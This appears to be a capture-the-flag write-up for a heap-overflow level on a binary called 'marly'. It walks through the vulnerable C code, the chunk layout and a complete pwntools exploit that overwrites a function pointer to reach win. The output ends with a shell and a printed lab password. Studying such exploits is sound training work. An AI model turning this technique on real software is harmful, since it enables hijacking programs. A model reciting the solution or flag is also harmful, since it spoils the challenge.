In this binary, the program allows the user to interact with an array of pointers (`gallery`) storing objects of type `piece_t`:

```c
typedef struct piece_s {
    void (*render)(struct piece_s *);
    char title[TITLE_SIZE];
} piece_t;
//1)acquire
static void acquire(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_PIECES) return;
    gallery[i] = malloc(sizeof(piece_t));
    gallery[i]->render = show_title;
    memset(gallery[i]->title, 0, TITLE_SIZE);
    printf("[MARLY] acquired piece in slot %ld.\n", i);
}
//2)annotate
static void annotate(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_PIECES || !gallery[i]) return;
    printf("len: "); fflush(stdout); size_t n = (size_t)rd_long();
    printf("text: "); fflush(stdout);
    read(STDIN_FILENO, gallery[i]->title, n);
}
//3)display
static void display(void) {
    printf("slot: "); fflush(stdout); long i = rd_long();
    if (i < 0 || i >= MAX_PIECES || !gallery[i]) return;
    gallery[i]->render(gallery[i]);
}
// 4)deaccession 5)quit : i ignore these
```

When calling `acquire()`, the program allocates a `piece_t` object using `malloc(sizeof(piece_t))` and initializes its `render` function pointer to `show_title`.

In `annotate()`, the program prompts for a length `n` and reads input directly into `gallery[i]->title`:

```c
read(STDIN_FILENO, gallery[i]->title, n);

```

Crucially, `n` is user-controlled and unbounded. Because no bounds check validates `n` against `TITLE_SIZE` (40 bytes), an unbounded heap buffer overflow exists.

The `sizeof(piece_t)` is 48 bytes (8-byte `render` function pointer + 40-byte `title` buffer). When two consecutive chunks (A and B) are allocated via `malloc`, Chunk A sits at a lower memory address than Chunk B.

Our exploit flow:

1. Allocate Chunk A (`slot 0`) and Chunk B (`slot 1`).
When `malloc` allocates Chunk A (`slot 0`) and Chunk B (`slot 1`) sequentially, **Chunk A resides at a lower memory address than Chunk B**.

```txt
[ Lower Address ]
+-------------------------------------------------------+
| Chunk A Header & Data (piece_t @ slot 0)              |
|  - render (8 bytes) @ +0                              |
|  - title[40] (40 bytes) @ +8                          |
+-------------------------------------------------------+
| Chunk B Header (16 bytes)                             |
|  - prev_size (8 bytes)                                |
|  - size | A|M|P flags (8 bytes)                       |
+-------------------------------------------------------+
| Chunk B Data (piece_t @ slot 1)                       |
|  - render (8 bytes)  <-- Target overwrite location    |
|  - title[40] (40 bytes)                               |
+-------------------------------------------------------+
[ Higher Address ]

```
2. Calculate the payload size starting from `gallery[0]->title` (offset +8 in Chunk A):
* **40 bytes**: Fill the remainder of Chunk A's `title` array.
* **8 bytes**: Overwrite Chunk B's `prev_size` header field.
* **8 bytes**: Overwrite Chunk B's `size` header field (preserving size `0x30` with `PREV_INUSE` set $\rightarrow$ `0x31`).
* **8 bytes**: Overwrite Chunk B's `render` function pointer with the address of `win`, total payload length: **64 bytes**.

```py
p = connect()

p.recvline(timeout=TIMEOUT)
p.recvline(timeout=TIMEOUT)
recv = p.recvline(timeout=TIMEOUT).strip()

leaked_win =  int(recv[len(b'\x1b[0m[MARLY] curator @ '):], 16)

# allocate chunk A , B
# chunk A
p.recvuntil(b"> ")
p.send(b'1')
p.recvuntil(b'slot: ')
p.send(b'0')

# chunk B
p.recvuntil(b"> ")
p.send(b'1')
p.recvuntil(b'slot: ')
p.send(b'1')

# overflow the chunk A
p.recvuntil(b'> ')
p.send(b'2')
p.recvuntil(b"slot: ")
p.send(b'0')
p.recvuntil(b"len: ")
l1 = b'64'
p.send(l1)
p.recvuntil(b"text: ")
chunk_b_size = 48 | 0x1
# [40-mem-chunA]+[8+prev-size][8-chunkB-size+AMP-flag]+[8-firstbyte-in-chunk=leaked_pointer_win]
payload = b'A'*40 + b'\x00'*8+p64(chunk_b_size) + p64(leaked_win)
p.send(payload)
```
4. Finaly invoke `display()` on `slot 1` (`gallery[1]`). The program executes `gallery[1]->render(gallery[1])`, redirecting execution flow to `win`.

Result: 
```sh
level04@override:~$ python3 exploit.py 
[+] Starting local process './marly': pid 46139
[*] Switching to interactive mode
$ ls
README  exploit.py  marly  marly.c
$ whoami
flag04
$ cat /home/flag04/.pass
nq4hvqtyfsd4khbjshrc2e47pzdz00uq
```

